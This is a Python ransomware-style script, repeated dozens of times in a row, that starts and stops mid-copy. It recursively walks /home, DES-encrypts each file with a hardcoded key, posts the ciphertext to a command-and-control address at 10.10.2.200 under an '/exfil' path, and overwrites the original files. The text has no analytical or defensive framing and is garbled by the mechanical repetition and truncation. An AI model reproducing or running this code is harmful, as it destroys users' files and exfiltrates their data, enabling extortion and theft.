def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
